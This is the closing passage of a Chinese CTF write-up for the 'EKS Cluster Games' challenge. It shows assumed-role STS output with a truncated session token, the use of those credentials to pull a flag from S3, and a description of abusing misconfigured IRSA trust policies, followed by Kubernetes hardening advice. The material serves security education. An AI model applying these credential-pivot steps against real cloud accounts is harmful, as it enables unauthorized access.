        "SessionToken": "IQoJb3JpZ2luX2VjEPn//////////wEaCXVzLXdlc3QtMSJHMEUCICMd1Wn8Vp83saPOqeXsifXhposvzCoiZVu5frKLCWjq[...]8ksKhw84=",
        "Expiration": "2023-11-13T10:07:14+00:00"
    },
    "SubjectFromWebIdentityToken": "system:serviceaccount:challenge5:debug-sa",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA2AVYNEVMZEZ2AFVYI:test",
        "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test"
    },
    "Provider": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",
    "Audience": "sts.amazonaws.com"
}
```

配置该会话凭证（当前env中有“AWS\_ACCESS\_KEY_ID”等变量，可在环境变量中配置或将环境变量清空，在文件中配置），确认当前身份为“arn:aws:sts::688655246681:assumed-role/challengeEksS3Role”开头，然后便可访问 S3 对象：

```ruby
root@wiz-eks-challenge:~
{
    "UserId": "AROA2AVYNEVMZEZ2AFVYI:test",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test"
}

root@wiz-eks-challenge:~
download: s3://challenge-flag-bucket-3ff1ae2/flag to ./flag

root@wiz-eks-challenge:~
wiz_eks_challenge{xxxxx}
```

最终获取flag。

### 安全思考:从集群服务移动到云账户风险

IRSA（IAM roles for service accounts）具有使用户能够将 IAM 角色关联至 Kubernetes 服务账户的功能。其精髓在于采用 Kubernetes 的服务账户令牌卷投影特性，确保引用 IAM 角色的服务账户 Pod 在启动时访问 AWS IAM 的公共 OIDC 发现端点。该端点主要负责为 Kubernetes 颁发的 OIDC 令牌进行数字签名，从而使得目标 Pod 可以调用与 AWS API 相关的 IAM 角色。  

当使用 AWS SDK 调用 AWS API 时，系统会执行 sts:AssumeRoleWithWebIdentity，同时会自动将 Kubernetes 颁发的令牌转换为 AWS 角色凭证。当IAM信任策略配置不当时，我们可以通过`aws sts assume-role-with-web-identity`命令扮演另一个角色，从获取更广泛的权限。

**集群安全最佳实践**

在使用Kubernetes 服务时，需要在多个环节做到最佳安全实践，包括但不限于身份与访问管理、运行时安全、镜像安全、网络安全、数据安全、检测控制等。常见的做法如下：

### 遵循权限最小化配置集群角色

### 在配置Kuberntes集群角色权限时，应采用白名单的手法，明确所需权限，禁止使用"*"通配符，避免权限过高风险。同样可以使用KubiScan等权限扫描工具定期排查相关风险。  

### 禁用服务账户令牌的自动挂载机制

### 如果Pod中的应用程序不需要调用Kubernetes API，则可以取消掉服务账户的自动挂载机制，防止恶意攻击者通过应用漏洞进入容器内，利用服务账户进行集群内横向移动、权限提升。

### 谨慎赋予容器Capability

### 与Kubernetes集群角色类似，应该采用白名单的方式，为容器添加所需的Capability，防止恶意攻击者进行权限提升和容器逃逸。

### 弃用IMDSv1，使用IMDSv2

### IMDSv1存在一定的风险，且出现过较为严重的安全事件，AWS官方已明确提示使用IMDSv2代替IMDSv1，并于2024年年中起，新发布的Amazon EC2实例类型将仅使用v2版本的IMDS。

### 以非 root 用户身份运行容器内的应用程序

### 在默认情况下，容器会以root用户身份运行，这显然不符合最佳实践。如果攻击者利用应用程序的漏洞获取到容器内的权限，则可能进行一些高危操作。以非root用户身份运行，可以增加攻击者的门槛，降低边界突破对容器环境的影响。

### 合理设置容器注册表凭据权限

### 业务环境中的容器注册表凭据，应仅拥有镜像的拉取权限，一旦赋予推送权限，则可能造成供应链攻击风险。

### 敏感信息筛查

### 在构建镜像、运行业务应用程序、部署容器环境的过程中，尽可能消除一切可能暴露给攻击者的敏感信息，同时采用加密方式存储，避免敏感信息泄露。

### 为各容器设置请求与限制，以避免资源争用与 DoS 攻击

容器在启动中应合理分配资源，防止攻击者通过恶意操作耗尽集群资源，造成DoS攻击。

更多内容可以参考《Amazon EKS安全最佳实践指南》\[5\]。

**总结**

“EKS Cluster Games”挑战赛的五道题目，都较为贴近真实的集群攻防场景。我们希望通过对题目的解析，加深对这些攻防技术的理解，并且帮助大家理清真实集群环境中相似场景下的风险点，站在防御的角度上杜绝这类风险的发生，为云安全事业添砖加瓦，促进云计算产业安全、可持续的发展。

**彩蛋：** **关注云鼎实验室公众号，回复“k8s攻防全景图”有惊喜~**
---------------------------------------

**参考文章**

1.  https://eksclustergames.com/
    
2.  https://kubernetes.io/docs/concepts/security/rbac-good-practices/#listing-secrets
    
3.  http://liubin.org/blog/2021/04/14/k8s-secrets-secret/
    
4.  https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md
    
5.  https://blog.aquasec.com/the-ticking-supply-chain-attack-bomb-of-exposed-kubernetes-secrets
    
6.  https://xiandin.s3.cn-northwest-1.amazonaws.com.cn/2020+MAD/Amazon%2BEKS%E5%AE%89%E5%85%A8%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97%2Bcn%2B202011.pdf